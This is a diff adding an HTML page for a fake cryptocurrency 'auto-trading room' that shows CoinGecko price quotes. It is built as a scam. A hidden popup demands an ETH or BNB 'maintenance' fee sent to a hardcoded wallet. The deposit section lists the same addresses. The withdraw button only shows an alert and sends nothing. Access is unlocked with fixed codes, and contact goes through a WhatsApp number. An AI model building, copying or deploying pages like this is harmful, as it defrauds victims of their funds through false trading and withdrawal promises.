@@ -1,0 +1,102 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Blockchain Auto-Trading Room</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+</head>
+<body class="bg-gray-900 text-white font-sans">
+  <header class="bg-gray-800 p-4 shadow-md text-center">
+    <h1 class="text-3xl font-bold">Blockchain Auto-Trading Room</h1>
+    <p class="text-sm">Admin Contact: <a href="https://wa.me/12096635424" class="text-green-400">+1 (209) 663-5424</a></p>
+  </header>
+  <main class="p-6 space-y-8">
+    <!-- Existing Sections (Profile, KYC, Wallet, Trade) injected here -->
+    <section id="metatraderPage" class="p-6 bg-gray-800 text-white">
+      <h2 class="text-2xl font-bold mb-4">Trading Domain (MetaTrader 5 Style)</h2>
+      <div class="grid grid-cols-5 gap-2 mb-4">
+        <button class="bg-blue-600 p-2 rounded">Quotes</button>
+        <button class="bg-green-600 p-2 rounded">Charts</button>
+        <button class="bg-yellow-600 p-2 rounded">Trade</button>
+        <button class="bg-purple-600 p-2 rounded">History</button>
+        <button class="bg-gray-600 p-2 rounded">Messages</button>
+      </div>
+      <div class="bg-gray-700 p-4 rounded">
+        <p class="text-lg">Live Price Updates (via CoinGecko):</p>
+        <ul class="list-disc list-inside" id="liveQuotes"></ul>
+      </div>
+    </section><section id="maintenancePopup" class="hidden fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex items-center justify-center">
+  <div class="bg-gray-800 p-6 rounded w-96">
+    <h3 class="text-xl font-bold mb-4">Maintenance Required</h3>
+    <p>Your account requires maintenance to continue trading. Please send the following amount:</p>
+    <p class="text-green-400 mt-2 mb-4">0.12 ETH or 0.19 BNB</p>
+    <p class="text-sm">Send to:</p>
+    <p class="mb-2">0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130</p>
+    <button onclick="validateMaintenanceCode()" class="bg-blue-500 px-4 py-2 rounded">Enter Maintenance Code</button>
+  </div>
+</section>
+
+<section id="depositPage" class="p-6 bg-gray-800 text-white">
+  <h2 class="text-2xl font-bold mb-4">Deposit Funds</h2>
+  <input type="number" placeholder="Enter Amount" class="w-full p-2 mb-4 text-black rounded">
+  <div class="space-y-2">
+    <div>ETH: 0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130 <button class="ml-2 bg-yellow-400 text-black px-2 py-1 rounded">Copy</button></div>
+    <div>BNB: 0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130 <button class="ml-2 bg-yellow-400 text-black px-2 py-1 rounded">Copy</button></div>
+    <div>TRC20: TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco <button class="ml-2 bg-yellow-400 text-black px-2 py-1 rounded">Copy</button></div>
+  </div>
+  <div class="mt-4">
+    <input type="text" placeholder="Enter Deposit Code" class="w-full p-2 mb-2 text-black rounded">
+    <button class="bg-green-600 px-4 py-2 rounded">Submit Code</button>
+  </div>
+</section>
+
+<section id="withdrawalPage" class="p-6 bg-gray-800 text-white">
+  <h2 class="text-2xl font-bold mb-4">Withdraw Funds</h2>
+  <label class="block mb-1">Withdrawal Address:</label>
+  <input type="text" class="w-full p-2 mb-4 text-black rounded">
+  <label class="block mb-1">Amount:</label>
+  <input type="number" class="w-full p-2 mb-4 text-black rounded">
+  <label class="block mb-1">Network:</label>
+  <select class="w-full p-2 mb-4 text-black rounded">
+    <option>BNB BEP20</option>
+    <option>Ethereum</option>
+    <option>Tron TRC20</option>
+  </select>
+  <p class="text-sm text-gray-300 mb-4">Gas Fee will be calculated automatically.</p>
+  <button onclick="alert('Withdraw processing...')" class="bg-red-500 px-4 py-2 rounded">Withdraw</button>
+</section>
+
+  </main>  <footer class="bg-gray-800 p-4 text-center text-sm text-gray-400">
+    &copy; 2025 Blockchain Auto Trading Room | All rights reserved.
+  </footer>  <script>
+    async function fetchLivePrices() {
+      try {
+        const res = await axios.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin,tether,usd-coin,solana&vs_currencies=usd");
+        const quotes = res.data;
+        const container = document.getElementById("liveQuotes");
+        container.innerHTML = "";
+        for (const coin in quotes) {
+          const price = quotes[coin].usd;
+          container.innerHTML += `<li>${coin.toUpperCase()}: $${price}</li>`;
+        }
+      } catch (e) {
+        console.error("Failed to fetch quotes", e);
+      }
+    }
+    fetchLivePrices();
+    setInterval(fetchLivePrices, 10000);
+
+    function validateMaintenanceCode() {
+      const code = prompt("Enter your maintenance code");
+      const validAccessCodes = ["Bkdn3lwe5", "Bpht3gvu1", "Bmxz3ijp9", "Bzrf3kqb3"];
+      if (validAccessCodes.includes(code)) {
+        alert("Maintenance complete. Access restored.");
+        document.getElementById("maintenancePopup").classList.add("hidden");
+      } else {
+        alert("Invalid code. Access suspended.");
+      }
+    }
+  </script></body>
+</html>
